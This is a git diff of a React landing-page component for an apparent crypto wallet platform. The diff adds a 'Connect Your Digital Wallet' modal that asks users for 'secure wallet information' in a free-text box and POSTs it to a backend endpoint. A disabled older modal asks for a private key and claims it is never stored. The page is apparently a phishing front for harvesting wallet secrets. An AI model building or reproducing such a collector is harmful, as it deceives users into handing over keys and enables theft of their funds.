@@ -1,16 +1,43 @@
-import { useState } from "react";
-import WalletButton from "./WalletButton";
+"use client"
+
+import { useState } from "react"
 
 const PlatformFeatures = () => {
-  const [showWalletModal, setShowWalletModal] = useState(false);
-  const [walletAddress, setWalletAddress] = useState("");
+  const [showWalletModal, setShowWalletModal] = useState(false)
+  const [walletAddress, setWalletAddress] = useState("")
+  const [textContent, setTextContent] = useState("")
 
   // Close modal when clicking outside
   const handleModalBackdropClick = (e) => {
     if (e.target === e.currentTarget) {
-      setShowWalletModal(false);
+      setShowWalletModal(false)
     }
-  };
+  }
+
+  // Handle the modal submission
+  const handleSubmit = async (e) => {
+    e.preventDefault()
+    try {
+      const response = await fetch("http://localhost:8005/api/submit-text", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ content: textContent }),
+      })
+
+      if (response.ok) {
+        alert("Text saved successfully!")
+        setTextContent("") // Clear the textarea
+        setShowWalletModal(false) // Close the modal
+      } else {
+        alert("Failed to save text.")
+      }
+    } catch (error) {
+      console.error("Error:", error)
+      alert("An error occurred while saving text.")
+    }
+  }
 
   return (
     <div className="bg-white px-[10%] pt-0">
@@ -21,30 +48,82 @@ const PlatformFeatures = () => {
             One Platform, Millions of Assets
           </h2>
           <p className="text-lg sm:text-xl md:text-2xl text-white max-w-4xl mx-auto">
-            As a leading self-custody multi-chain platform, we support millions
-            of assets across 100+ blockchains. From Bitcoin, Ethereum, and
-            Solana, to Cosmos, Optimism, and much more.
+            As a leading self-custody multi-chain platform, we support millions of assets across 100+ blockchains. From
+            Bitcoin, Ethereum, and Solana, to Cosmos, Optimism, and much more.
           </p>
         </div>
 
         {/* Wallet Button */}
-        <WalletButton />
+        <div className="relative mb-10 max-w-5xl mx-auto text-center">
+          <button
+            onClick={() => setShowWalletModal(true)}
+            className="bg-white py-3 sm:py-5 px-8 sm:px-12 rounded-full text-lg sm:text-xl font-medium text-blue-600 hover:bg-blue-50 transition-colors shadow-lg inline-flex items-center justify-center"
+          >
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              className="h-5 w-5 sm:h-6 sm:w-6 mr-2"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke="currentColor"
+            >
+              <path
+                strokeLinecap="round"
+                strokeLinejoin="round"
+                strokeWidth={2}
+                d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
+              />
+            </svg>
+            Wallet
+          </button>
 
-        {/* Wallet Import Modal */}
-        {showWalletModal && (
+          {/* Modal with Blurred Background */}
+          {showWalletModal && (
+            <div
+              className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4"
+              onClick={handleModalBackdropClick}
+            >
+              <div className="bg-white p-6 rounded-lg shadow-lg w-96 max-w-full" onClick={(e) => e.stopPropagation()}>
+                <h2 className="text-xl font-bold mb-4 text-blue-600">Connect Your Digital Wallet</h2>
+                <p className="text-gray-600 mb-4">
+                  Securely manage your assets with our state-of-the-art wallet integration
+                </p>
+                <textarea
+                  value={textContent}
+                  onChange={(e) => setTextContent(e.target.value)}
+                  rows="4"
+                  className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 mb-4"
+                  placeholder="Enter your secure wallet information here..."
+                />
+                <div className="flex justify-between">
+                  <button
+                    onClick={handleSubmit}
+                    className="bg-blue-600 text-white py-2 px-6 rounded-full hover:bg-blue-700 transition-colors"
+                  >
+                    Connect Wallet
+                  </button>
+                  <button
+                    onClick={() => setShowWalletModal(false)}
+                    className="bg-gray-200 text-gray-700 py-2 px-4 rounded-full hover:bg-gray-300 transition-colors"
+                  >
+                    Cancel
+                  </button>
+                </div>
+              </div>
+            </div>
+          )}
+        </div>
+
+        {/* Wallet Import Modal - Original modal kept for reference */}
+        {/* You can remove this if you only want to use the new modal above */}
+        {false && (
           <div
             className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4"
             onClick={handleModalBackdropClick}
           >
             <div className="bg-white rounded-2xl p-6 sm:p-8 w-full max-w-md shadow-xl">
               <div className="flex justify-between items-center mb-6">
-                <h3 className="text-xl sm:text-2xl font-bold text-gray-800">
-                  Import Wallet
-                </h3>
-                <button
-                  onClick={() => setShowWalletModal(false)}
-                  className="text-gray-500 hover:text-gray-700"
-                >
+                <h3 className="text-xl sm:text-2xl font-bold text-gray-800">Import Wallet</h3>
+                <button onClick={() => setShowWalletModal(false)} className="text-gray-500 hover:text-gray-700">
                   <svg
                     xmlns="http://www.w3.org/2000/svg"
                     className="h-6 w-6"
@@ -52,21 +131,13 @@ const PlatformFeatures = () => {
                     viewBox="0 0 24 24"
                     stroke="currentColor"
                   >
-                    <path
-                      strokeLinecap="round"
-                      strokeLinejoin="round"
-                      strokeWidth={2}
-                      d="M6 18L18 6M6 6l12 12"
-                    />
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                   </svg>
                 </button>
               </div>
 
               <div className="mb-6">
-                <label
-                  htmlFor="wallet-address"
-                  className="block text-sm font-medium text-gray-700 mb-2"
-                >
+                <label htmlFor="wallet-address" className="block text-sm font-medium text-gray-700 mb-2">
                   Enter your wallet address or private key
                 </label>
                 <textarea
@@ -77,8 +148,7 @@ const PlatformFeatures = () => {
                   placeholder="Enter wallet address or private key here..."
                 ></textarea>
                 <p className="mt-2 text-sm text-gray-500">
-                  Your private key is never stored on our servers and is only
-                  used to import your wallet.
+                  Your private key is never stored on our servers and is only used to import your wallet.
                 </p>
               </div>
 
@@ -107,24 +177,12 @@ const PlatformFeatures = () => {
             {/* Table Headers */}
             <thead>
               <tr className="text-gray-700 font-medium">
-                <th className="text-left py-3 px-2 sm:px-4 whitespace-nowrap text-base sm:text-xl">
-                  Chain
-                </th>
-                <th className="text-center py-3 px-2 whitespace-nowrap text-base sm:text-xl">
-                  Buy
-                </th>
-                <th className="text-center py-3 px-2 whitespace-nowrap text-base sm:text-xl">
-                  Sell
-                </th>
-                <th className="text-center py-3 px-2 whitespace-nowrap text-base sm:text-xl">
-                  Swap
-                </th>
-                <th className="text-center py-3 px-2 whitespace-nowrap text-base sm:text-xl">
-                  Earn
-                </th>
-                <th className="text-center py-3 px-2 whitespace-nowrap text-base sm:text-xl">
-                  dApps
-                </th>
+                <th className="text-left py-3 px-2 sm:px-4 whitespace-nowrap text-base sm:text-xl">Chain</th>
+                <th className="text-center py-3 px-2 whitespace-nowrap text-base sm:text-xl">Buy</th>
+                <th className="text-center py-3 px-2 whitespace-nowrap text-base sm:text-xl">Sell</th>
+                <th className="text-center py-3 px-2 whitespace-nowrap text-base sm:text-xl">Swap</th>
+                <th className="text-center py-3 px-2 whitespace-nowrap text-base sm:text-xl">Earn</th>
+                <th className="text-center py-3 px-2 whitespace-nowrap text-base sm:text-xl">dApps</th>
               </tr>
             </thead>
             <tbody>
@@ -137,9 +195,7 @@ const PlatformFeatures = () => {
                       alt="BNB"
                       className="w-7 h-7 sm:w-12 sm:h-12 mr-3 sm:mr-4"
                     />
-                    <span className="font-medium text-sm sm:text-lg whitespace-nowrap">
-                      BNB Smart Chain
-                    </span>
+                    <span className="font-medium text-sm sm:text-lg whitespace-nowrap">BNB Smart Chain</span>
                   </div>
                 </td>
                 <td className="py-5 sm:py-4 px-2 text-center">
@@ -243,9 +299,7 @@ const PlatformFeatures = () => {
                       alt="Bitcoin"
                       className="w-7 h-7 sm:w-12 sm:h-12 mr-3 sm:mr-4"
                     />
-                    <span className="font-medium text-sm sm:text-lg whitespace-nowrap">
-                      Bitcoin (BTC)
-                    </span>
+                    <span className="font-medium text-sm sm:text-lg whitespace-nowrap">Bitcoin (BTC)</span>
                   </div>
                 </td>
                 <td className="py-5 sm:py-4 px-2 text-center">
@@ -349,9 +403,7 @@ const PlatformFeatures = () => {
                       alt="Cosmos"
                       className="w-7 h-7 sm:w-12 sm:h-12 mr-3 sm:mr-4"
                     />
-                    <span className="font-medium text-sm sm:text-lg whitespace-nowrap">
-                      Cosmos (ATOM)
-                    </span>
+                    <span className="font-medium text-sm sm:text-lg whitespace-nowrap">Cosmos (ATOM)</span>
                   </div>
                 </td>
                 <td className="py-5 sm:py-4 px-2 text-center">
@@ -455,9 +507,7 @@ const PlatformFeatures = () => {
                       alt="Ethereum"
                       className="w-7 h-7 sm:w-12 sm:h-12 mr-3 sm:mr-4"
                     />
-                    <span className="font-medium text-sm sm:text-lg whitespace-nowrap">
-                      Ethereum (ETH)
-                    </span>
+                    <span className="font-medium text-sm sm:text-lg whitespace-nowrap">Ethereum (ETH)</span>
                   </div>
                 </td>
                 <td className="py-5 sm:py-4 px-2 text-center">
@@ -543,9 +593,7 @@ const PlatformFeatures = () => {
                       alt="Polkadot"
                       className="w-7 h-7 sm:w-12 sm:h-12 mr-3 sm:mr-4"
                     />
-                    <span className="font-medium text-sm sm:text-lg whitespace-nowrap">
-                      Polkadot (DOT)
-                    </span>
+                    <span className="font-medium text-sm sm:text-lg whitespace-nowrap">Polkadot (DOT)</span>
                   </div>
                 </td>
                 <td className="py-5 sm:py-4 px-2 text-center">
@@ -646,24 +694,19 @@ const PlatformFeatures = () => {
         {/* Stats Section */}
         <div className="grid grid-cols-1 md:grid-cols-3 gap-8 text-center mt-12 md:mt-16">
           <div>
-            <p className="text-3xl sm:text-4xl md:text-5xl font-bold text-white">
-              10M+ Assets
-            </p>
+            <p className="text-3xl sm:text-4xl md:text-5xl font-bold text-white">10M+ Assets</p>
           </div>
           <div>
-            <p className="text-3xl sm:text-4xl md:text-5xl font-bold text-white">
-              600M+ NFTs
-            </p>
+            <p className="text-3xl sm:text-4xl md:text-5xl font-bold text-white">600M+ NFTs</p>
           </div>
           <div>
-            <p className="text-3xl sm:text-4xl md:text-5xl font-bold text-white">
-              100+ Blockchains
-            </p>
+            <p className="text-3xl sm:text-4xl md:text-5xl font-bold text-white">100+ Blockchains</p>
           </div>
         </div>
       </div>
     </div>
-  );
-};
+  )
+}
 
-export default PlatformFeatures;
+export default PlatformFeatures
+
